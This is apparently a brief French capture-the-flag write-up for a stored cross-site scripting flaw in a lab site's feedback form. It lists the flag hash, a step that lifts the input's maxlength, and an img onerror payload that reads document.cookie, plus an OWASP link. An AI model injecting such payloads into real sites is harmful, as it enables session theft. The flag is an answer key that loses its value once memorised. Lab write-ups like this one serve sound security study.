# XSS COMMENT

## Flag
```
0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
```

## Découverte

Sur la page http://{IP_ADDRESS}/?page=feedback dans le formulaire de feedback \
on peut injecter un script en modifiant le maxlength du input txtName. Par \
example:
```
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
```

## Documentation
- [owasp - Cross-site_Scripting](https://wiki.owasp.org/index.php/Cross-site_Scripting_(XSS))

---

[RETURN](https://github.com/jlange91/darkly)
